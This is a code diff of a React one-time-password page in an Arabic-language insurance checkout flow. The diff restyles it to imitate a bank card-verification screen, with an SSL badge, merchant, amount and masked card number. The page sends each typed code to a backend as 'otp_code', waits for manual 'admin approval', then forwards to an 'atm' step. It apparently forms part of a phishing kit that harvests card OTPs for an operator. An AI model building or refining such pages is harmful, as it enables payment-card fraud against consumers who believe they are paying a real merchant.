@@ -2,7 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { motion } from "framer-motion";
 import { Button } from "@/components/ui/button";
-import { Shield, Lock, RefreshCw, Smartphone, Loader2 } from "lucide-react";
+import { Shield, Lock, RefreshCw, Loader2, CreditCard } from "lucide-react";
 import InsuranceStepper from "@/components/InsuranceStepper";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { toast } from "sonner";
@@ -15,18 +15,21 @@ const OTPVerification = () => {
   const o = t.otp;
   const offer = location.state?.offer;
   const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
+  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
+  const totalPrice = offer?.totalPrice || offer?.price || 0;
+  const companyName = offer?.company || "بي كير";
 
-  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [otp, setOtp] = useState("");
   const [loading, setLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [timer, setTimer] = useState(120);
   const [canResend, setCanResend] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const inputRef = useRef<HTMLInputElement>(null);
 
   const approvalStatus = useAdminApproval(orderId, "otp");
 
-  useEffect(() => { inputRefs.current[0]?.focus(); }, []);
+  useEffect(() => { inputRef.current?.focus(); }, []);
 
   useEffect(() => {
     if (timer <= 0) { setCanResend(true); return; }
@@ -38,7 +41,7 @@ const OTPVerification = () => {
     if (approvalStatus === "approved") {
       toast.success(o.verified);
       sessionStorage.setItem("insurance_order_id", orderId!);
-      navigate("/insurance/atm", { state: { offer, orderId } });
+      navigate("/insurance/atm", { state: { offer, orderId, cardLastFour } });
     } else if (approvalStatus === "rejected") {
       toast.error(o.rejected);
       setWaitingApproval(false);
@@ -46,94 +49,134 @@ const OTPVerification = () => {
     }
   }, [approvalStatus, orderId, navigate, offer]);
 
-  const handleChange = (i: number, v: string) => {
-    if (!/^\d*$/.test(v)) return;
-    const n = [...otp]; n[i] = v.slice(-1); setOtp(n);
-    if (v && i < 5) inputRefs.current[i + 1]?.focus();
-  };
-
-  const handleKeyDown = (i: number, e: React.KeyboardEvent) => {
-    if (e.key === "Backspace" && !otp[i] && i > 0) inputRefs.current[i - 1]?.focus();
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    const p = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
-    if (p.length === 6) { setOtp(p.split("")); inputRefs.current[5]?.focus(); }
-  };
-
   const handleVerify = async () => {
-    if (otp.join("").length !== 6) return;
+    if (otp.length < 4) return;
     setLoading(true);
-    const id = await createOrUpdateStage(orderId, "otp", { otp_verified: false, otp_code: otp.join("") });
+    const id = await createOrUpdateStage(orderId, "otp", { otp_verified: false, otp_code: otp });
     setOrderId(id);
     setWaitingApproval(true);
   };
 
   const handleResend = () => {
-    setTimer(120); setCanResend(false); setOtp(["", "", "", "", "", ""]);
-    inputRefs.current[0]?.focus();
+    setTimer(120); setCanResend(false); setOtp("");
+    inputRef.current?.focus();
   };
 
   const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;
+
+  if (!offer) {
+    return (
+      <div className="min-h-screen bg-background">
+        <div className="flex items-center justify-center min-h-[60vh]">
+          <p className="text-muted-foreground">{o.title}</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-[100dvh] bg-secondary/30">
       <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
         <div className="max-w-5xl mx-auto">
           <InsuranceStepper active={2} />
-          <div className="max-w-md mx-auto">
-            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
-              <div className="bg-card rounded-2xl border border-border shadow-sm p-5 md:p-8 text-center">
-                <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }} className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-6">
-                  <Smartphone className="w-8 h-8 text-primary" />
-                </motion.div>
+
+          <div className="max-w-sm mx-auto">
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
+              <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">
+
+                {/* Header - Bank style */}
+                <div className="bg-primary/5 border-b border-border px-5 py-4">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
+                        <CreditCard className="w-4 h-4 text-primary" />
+                      </div>
+                      <span className="text-xs font-semibold text-foreground">{o.title}</span>
+                    </div>
+                    <div className="flex items-center gap-1.5">
+                      <Lock className="w-3 h-3 text-primary/60" />
+                      <span className="text-[10px] text-muted-foreground">SSL</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Transaction details */}
+                <div className="px-5 pt-5 pb-4 space-y-3">
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-muted-foreground">التاجر</span>
+                    <span className="font-semibold text-foreground">{companyName}</span>
+                  </div>
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-muted-foreground">المبلغ</span>
+                    <span className="font-bold text-foreground text-sm">{totalPrice.toLocaleString()} ر.س</span>
+                  </div>
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-muted-foreground">البطاقة</span>
+                    <span className="font-mono font-semibold text-foreground tracking-wider" dir="ltr">•••• {cardLastFour}</span>
+                  </div>
+                  <div className="border-t border-dashed border-border" />
+                </div>
 
                 {waitingApproval ? (
-                  <div className="space-y-4 py-4">
+                  <div className="px-5 pb-5 space-y-4 text-center py-6">
                     <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
                     <h3 className="text-sm font-bold text-foreground">{o.waitingApproval}</h3>
                     <p className="text-xs text-muted-foreground">{o.waitingReview}</p>
                   </div>
                 ) : (
-                  <>
-                    <h2 className="text-lg md:text-xl font-bold text-foreground mb-2">{o.title}</h2>
-                    <p className="text-xs md:text-sm text-muted-foreground mb-1">{o.subtitle}</p>
-                    <p className="text-xs md:text-sm font-bold text-foreground mb-6 md:mb-8 flex items-center justify-center gap-1" dir="ltr">
-                      <Lock className="w-3 h-3 text-primary" />05•••••89
-                    </p>
-
-                    <div className="flex gap-2 md:gap-2.5 justify-center mb-5 md:mb-6" dir="ltr" onPaste={handlePaste}>
-                      {otp.map((digit, i) => (
-                        <motion.input key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 + i * 0.05 }}
-                          ref={(el) => { inputRefs.current[i] = el; }} type="text" inputMode="numeric" maxLength={1} value={digit}
-                          onChange={(e) => handleChange(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)}
-                          className={`w-10 h-12 md:w-12 md:h-14 text-center text-lg md:text-xl font-bold rounded-xl border-2 transition-all focus:outline-none ${digit ? "border-primary bg-primary/5 text-primary shadow-sm shadow-primary/10" : "border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20"}`}
-                        />
-                      ))}
+                  <div className="px-5 pb-5">
+                    <label className="block text-xs font-medium text-foreground mb-2">{o.subtitle}</label>
+                    <div className="relative" dir="ltr">
+                      <input
+                        ref={inputRef}
+                        type="text"
+                        inputMode="numeric"
+                        value={otp}
+                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                        placeholder="••••••"
+                        className="w-full h-12 text-center text-xl font-bold tracking-[0.5em] rounded-xl border-2 border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none transition-all placeholder:tracking-[0.3em] placeholder:text-muted-foreground/40"
+                      />
                     </div>
 
-                    <div className="mb-6">
+                    {/* Timer / Resend */}
+                    <div className="flex justify-center mt-3 mb-4">
                       {canResend ? (
-                        <button onClick={handleResend} className="flex items-center gap-2 text-sm text-primary hover:text-primary/80 mx-auto font-medium transition-colors">
-                          <RefreshCw className="w-4 h-4" />{o.resendCode}
+                        <button onClick={handleResend} className="flex items-center gap-1.5 text-xs text-primary hover:text-primary/80 font-medium transition-colors">
+                          <RefreshCw className="w-3.5 h-3.5" />{o.resendCode}
                         </button>
                       ) : (
-                        <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-4 py-1.5">
-                          <span className="text-xs text-muted-foreground">{o.resendIn}</span>
-                          <span className="text-sm text-primary font-bold font-mono">{fmtTime(timer)}</span>
+                        <div className="inline-flex items-center gap-1.5 bg-secondary/70 rounded-full px-3 py-1">
+                          <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
+                          <span className="text-xs text-primary font-bold font-mono">{fmtTime(timer)}</span>
                         </div>
                       )}
                     </div>
 
-                    <Button onClick={handleVerify} disabled={loading || otp.join("").length !== 6} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm md:text-base gap-2">
-                      <Lock className="w-4 h-4" />{loading ? o.verifying : o.confirmPayment}
+                    {loading && (
+                      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex items-center justify-center gap-2 mb-3">
+                        <Loader2 className="w-4 h-4 text-primary animate-spin" />
+                        <span className="text-xs text-muted-foreground">{o.verifying}</span>
+                      </motion.div>
+                    )}
+
+                    <Button
+                      onClick={handleVerify}
+                      disabled={loading || otp.length < 4}
+                      className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2"
+                    >
+                      {loading ? (
+                        <><Loader2 className="w-4 h-4 animate-spin" />{o.verifying}</>
+                      ) : (
+                        <><Lock className="w-3.5 h-3.5" />{o.confirmPayment}</>
+                      )}
                     </Button>
-                  </>
+                  </div>
                 )}
 
-                <div className="flex items-center justify-center gap-2 mt-6 pt-4 border-t border-border">
-                  <Shield className="w-4 h-4 text-primary/60" />
-                  <span className="text-xs text-muted-foreground">{o.secureProcess}</span>
+                {/* Footer */}
+                <div className="bg-secondary/40 border-t border-border px-5 py-3 flex items-center justify-center gap-2">
+                  <Shield className="w-3.5 h-3.5 text-primary/60" />
+                  <span className="text-[10px] text-muted-foreground">{o.secureProcess}</span>
                 </div>
               </div>
             </motion.div>
